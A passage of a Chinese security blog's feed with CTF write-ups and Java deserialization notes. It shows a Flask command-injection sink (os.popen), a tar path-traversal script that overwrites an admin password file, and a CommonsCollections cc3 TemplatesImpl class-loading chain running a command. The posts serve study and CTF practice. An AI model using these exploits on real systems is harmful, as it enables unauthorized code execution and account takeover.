class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> os.popen(filename).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329213526571.png" alt="image-20230329213526571"></p><p>这里就是使用上面的那个cve进行main.py的覆盖，覆盖后会进行重载，就是自己写一段main.py的代码，可以进行命令执行的，main.py是root的用户</p><p>然后就可以成功rce了</p><p>这三道题收获挺多</p><h2 id="NSSRound-7-Team-新的博客"><a href="#NSSRound-7-Team-新的博客" class="headerlink" title="[NSSRound#7 Team]新的博客"></a>[NSSRound#7 Team]新的博客</h2><p>考点</p><p><img src="../images/image-20230329213834003.png" alt="image-20230329213834003"></p><p>题目</p><p><img src="../images/image-20230330192411011.png" alt="image-20230330192411011"></p><p><img src="../images/image-20230330193239428.png" alt="image-20230330193239428"></p><p>经过两次base和hex解密就得到<code>/static/www.tar.gz</code></p><p>然后访问就会下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app/                                                                                                0000777 0000000 0000000 00000000000 14332615660 010036  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/                                                                                           0000777 0000000 0000000 00000000000 14332615660 010763  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/userinfo.json                                                                              0000777 0000000 0000000 00000000222 14332613615 013505  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        &#123;</span><br><span class="line">&quot;admin&quot;: &quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;</span><br><span class="line">&#125;                                                                                                                                                                                                                                                                                                                                                                              app/userData/                                                                                       0000777 0000000 0000000 00000000000 14332615671 011610  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/                                                                                 0000777 0000000 0000000 00000000000 14332615671 012700  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/flag                                                                             0000777 0000000 0000000 00000000070 14332613676 013537  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        想多了这里没有flag</span><br><span class="line"></span><br><span class="line">只有admin才能获得flag   </span><br></pre></td></tr></table></figure><p>通过这个下载的内容我们知道它的目录文件结构</p><p><img src="../images/image-20230330193459337.png" alt="image-20230330193459337"></p><p><img src="../images/image-20230330193539095.png" alt="image-20230330193539095"></p><p>点击博客备份的话会下载用户名.tar.gz文件，所以知道一个结构</p><p><img src="../images/image-20230330193641866.png" alt="image-20230330193641866"></p><p>我们和上一个目录结构对比一下，也有一个flag，然后上面一个用户名，我们根据文件明猜测所有的用户都放在userData之下，包括admin用户。</p><p>所以非预期解就是利用博客恢复功能，上传tar.gz文件，利用这个flag软连接指向/app/conf/userinfo.json，然后再上传一个我们修改后的admin的sha1的json文件，就可以修改admin的密码</p><p>这里因为与软链接连接过后，修改目标文件的话，源文件也会跟着修改，所以我们就直接去修改这个用户名.tar.gz，然后app/conf/userinfo.json也会被修改，所以就是可以自定义admin的密码了(因为还是那个漏洞，就是解压时会覆盖掉目录中的文件)</p><p><strong>预期解</strong></p><p>预期解是利用目录穿越直接覆盖掉userinfo.json文件吧，在搞预期解的时候真的非常头疼，一直手撸不出来那个目录结构，同时利用官方WP的脚本一直报错，就很难受，无奈只能改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;qingfeng&#x27;</span> <span class="comment"># 你注册时用的用户名，尽量别有奇怪的符号</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 之后要使用admin账户登陆时的密码</span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h2><p>考点</p><p><img src="../images/image-20230330202900747.png" alt="image-20230330202900747"></p><p>题目</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;NSSRound-1-Basic-basic-check&quot;&gt;&lt;a href=&quot;#NSSRound-1-Basic-basic-check&quot; class=&quot;headerlink&quot; title=&quot;[NSSRound#1 Basic]basic_check&quot;&gt;&lt;/a&gt;[</summary>
      
    
    
    
    
    <category term="nssctf web" scheme="https://ke1nys.github.io/tags/nssctf-web/"/>
    
  </entry>
  
  <entry>
    <title>动态类加载</title>
    <link href="https://ke1nys.github.io/posts/fcb7f5f0.html"/>
    <id>https://ke1nys.github.io/posts/fcb7f5f0.html</id>
    <published>2023-03-20T08:45:43.000Z</published>
    <updated>2023-04-06T06:48:36.161Z</updated>
    
    <content type="html"><![CDATA[<p>视频地址 <a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;vd_source=bacfffe46b930fda5761b63367eb298c">动态类加载</a></p><p><img src="../images/image-20230320171305517.png" alt="image-20230320171305517"></p><p>学习这个东西得需要两个代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;无参person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参person&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是相较于以前多了(下面的三个东西)</p><p><img src="../images/image-20230320165602512.png" alt="image-20230320165602512"></p><p>在new一个无参对象的时候</p><p><img src="../images/image-20230320165706358.png" alt="image-20230320165706358"></p><p>在new一个有参对象的时候</p><p><img src="../images/image-20230320165748935.png" alt="image-20230320165748935"></p><p>是一样的</p><p>都是先静态代码块——-&gt;   构造代码块    ——-&gt;  有(无)参方法</p><p><img src="../images/image-20230320170134879.png" alt="image-20230320170134879"></p><p>当调用类的方法的时候，就不会调用其他关于对象的方法</p><p><img src="../images/image-20230320170226755.png" alt="image-20230320170226755"></p><p>这三个就是和对象相关的，所以不会调用</p><p><img src="../images/image-20230320170355436.png" alt="image-20230320170355436"></p><p>在调用这个静态变量的时候也调用了这个静态代码块</p><p>在类加载的时候是不会进行任何方法或者变量的调用的</p><p><img src="../images/image-20230320171803411.png" alt="image-20230320171803411"></p><p>上面的方法都是写死的，不能进行动态加载，所以这里我们就用到了之前在反射里面用到的方法      <strong>forName</strong></p><p><img src="../images/image-20230320172620889.png" alt="image-20230320172620889"></p><p>就是这个方法进行了<strong>初始化</strong>的操作   (已知初始化操作会执行静态代码块)</p><p><img src="../images/image-20230320172703713.png" alt="image-20230320172703713"></p><p>然后跟进这个forName0的方法，这个方法是native写的，是c来写的</p><p><img src="../images/image-20230320175604207.png" alt="image-20230320175604207"></p><p>他里面有几个参数</p><p>第一个是传类名，第二个是判断是否初始化，第三个是类加载器，第四个不重要</p><p>因为forName里面默认的是否初始化是true，所以如果想让他不进行初始化的话，就传值，因为Class这个类里边还有另一个forName</p><p><img src="../images/image-20230320180218646.png" alt="image-20230320180218646"></p><p>因为ClassLoader是一个抽象类，不能实例化，但是他有个静态方法是可以实例化的</p><p><img src="../images/image-20230320180742675.png" alt="image-20230320180742675"></p><p>这里只传三个参数是因为forName只有三个参数，forName0才是有四个参数的</p><p>这样写就不能进行实例化和初始化了</p><p>我们可以利用反射里面学的newIntance()方法来进行实例化和初始化了</p><p><img src="../images/image-20230320183317612.png" alt="image-20230320183317612"></p><p><strong>上面大概介绍完就开始讲这个类加载器的东西了</strong></p><p><img src="../images/image-20230320184323015.png" alt="image-20230320184323015"></p><p>就是利用这个动态类加载来进行实例化对象(<strong>这里说明一下这个loadClass是不进行初始化的</strong>)</p><p><img src="../images/image-20230320184435751.png" alt="image-20230320184435751"></p><p>上面是简单的介绍，详细的看这篇文章      <a href="https://zhuanlan.zhihu.com/p/567962697">动态类加载</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频地址 &lt;a href=&quot;https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;动态类加载&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;</summary>
      
    
    
    
    
    <category term="java 动态类加载" scheme="https://ke1nys.github.io/tags/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc3</title>
    <link href="https://ke1nys.github.io/posts/a68e45f7.html"/>
    <id>https://ke1nys.github.io/posts/a68e45f7.html</id>
    <published>2023-03-20T08:41:18.000Z</published>
    <updated>2023-04-06T06:48:36.153Z</updated>
    
    <content type="html"><![CDATA[<p>cc3这条链和前面的cc1和cc6是不同的，这个执行命令用的是<strong>动态类加载</strong></p><p>不是Runtime.getRuntime.exec()</p><p>所以说学这条链子之前得去学下啥是动态类加载</p><p> 因为动态类加载的时候会调用loadclass，然后loadclass最后就会调用到defineclass,然后因为最后调用的defineclass不是public的，所以我们得去找哪个类里边重写了这个函数，并且是public的</p><p><img src="../images/image-20230321221053484.png" alt="image-20230321221053484"></p><p>这个函数参数的找不到有重写然后是public的调用他</p><p>然后发现了这种类型的defineclass有函数调用</p><p><img src="../images/image-20230321221604507.png" alt="image-20230321221604507"></p><p>然后还是default类型的(这个类型说明了这个包里可以调用他)</p><p>然后我们跟进去，看谁调用了这个default的defineclass</p><p><img src="../images/image-20230321221849460.png" alt="image-20230321221849460"></p><p>在他自身类里边的这个函数调用了default方法，但是这个是private的，所以我们就继续找哪个public调用了他</p><p><img src="../images/image-20230321222150282.png" alt="image-20230321222150282"></p><p>然后找到了一个private方法里面有个实例化的方法，</p><p>所以我们就接着往下找，找哪个public方法里面调用了他</p><p><img src="../images/image-20230321222331758.png" alt="image-20230321222331758"></p><p>最后找到这个public就找完了</p><p>然后我们就得想想怎么控制这个实例化对象</p><p><img src="../images/image-20230322194209379.png" alt="image-20230322194209379"></p><p>然后看到上图就看到了defineTransletClasses()这个函数方法是可以赋值传参的</p><p><img src="../images/image-20230322194315725.png" alt="image-20230322194315725"></p><p>在满足上面的条件后就可以进行赋值了</p><p>通过上面的寻找，发现找的函数方法全在TemplatesImpI这个类里边，并且这个类还可以进行序列化，那么这个里面里边的参数我们就都可以进行控制了(反射)</p><p><img src="../images/image-20230322194840494.png" alt="image-20230322194840494"></p><p><strong>第一步的出发点</strong>，<strong>得用这个来触发defineClass</strong></p><p><img src="../images/image-20230322195037005.png" alt="image-20230322195037005"></p><p><img src="../images/image-20230322195128556.png" alt="image-20230322195128556"></p><p><img src="../images/image-20230322195140695.png" alt="image-20230322195140695"></p><p>这里话我们是想先去调用第二个if里边的函数方法，来给下面的实例化对象赋值</p><p>跟进这个函数后(就会发现有两个if必须满足，因为第一个如果不满足的话就会抛异常，第二个是因为得给他赋值让他调用函数方法)<strong>这里赋值的原因是因为这个TemplatesImpI类的构造函数没有进行赋值</strong></p><p><img src="../images/image-20230322195459426.png" alt="image-20230322195459426"></p><p>所以接下来我们开始进行赋值，先从getTransletInstance()这个函数开始，就是献给name赋值</p><p>然后再给_bytecodes赋值,因为就是不能让他抛异常(这里给bytecodes赋值是有讲究的)实例化时需要的类是由bytecodes赋值的，而且还由于最后的defineclass()函数，这里的话bytecodes的类型还是得进行限制的</p><p><img src="../images/image-20230322201130287.png" alt="image-20230322201130287"></p><p><img src="../images/image-20230322201336724.png" alt="image-20230322201336724"></p><p><img src="../images/image-20230322201345186.png" alt="image-20230322201345186"></p><p>最后写出来的成果</p><p>因为类里边的bytecodes是个二维数组，所以初始化的时候就先给他变为二维数组，然后因为得需要他的一维数组进行赋值，所以在嵌套一个一维数组</p><p>然后最后还有一个_tfactory没有进行赋值，所以我们就得对他进行赋值，不然会报错</p><p><img src="../images/image-20230322202030498.png" alt="image-20230322202030498"></p><p>这就是他的类型(然后这个参数是transient，就是不可以进行序列化的意思)</p><p>所以我们就猜它是在readObject里面进行赋值的</p><p><img src="../images/image-20230322202306042.png" alt="image-20230322202306042"></p><p>最下面就看到它了</p><p><img src="../images/image-20230322202519552.png" alt="image-20230322202519552"></p><p>赋值成功</p><p>然后运行发现没成功(发现在defineTransletClasses这个函数里边的下面那个参数为空，然后爆了空指针错误)</p><p><img src="../images/image-20230322203013541.png" alt="image-20230322203013541"></p><p>但是单休改这个参数没啥大的意义，因为transletIndex值为-1，到了下面的if判断还是会抛异常出错</p><p><img src="../images/image-20230322203529965.png" alt="image-20230322203529965"></p><p>所以我们就先得满足这个</p><p><img src="../images/image-20230322203759237.png" alt="image-20230322203759237"></p><p>让他的值不为-1，然后跟进去后发现</p><p><img src="../images/image-20230322203953283.png" alt="image-20230322203953283"></p><p>这里要求要和superClass里面的类相等，所以我们就得在弹计算器的类里边更改</p><p><strong>cc3完整代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">           field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/test.class&quot;</span>));</span><br><span class="line">           <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">           field1.set(templates,codes);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">           field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field2.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">           templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面写的代码是对这条链子的一个基本解释，接下来我们用cc1里的方法来对上面的代码进行反序列化操作</p><p><img src="../images/image-20230322214845664.png" alt="image-20230322214845664"></p><p>然后我们再把cc1后面的代码拿过来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cc3这条链和前面的cc1和cc6是不同的，这个执行命令用的是&lt;strong&gt;动态类加载&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不是Runtime.getRuntime.exec()&lt;/p&gt;
&lt;p&gt;所以说学这条链子之前得去学下啥是动态类加载&lt;/p&gt;
&lt;p&gt; 因为动态类加载的时候会</summary>
      
    
    
    
    
    <category term="java反序列化 cc3" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/"/>
    
  </entry>
  
</feed>
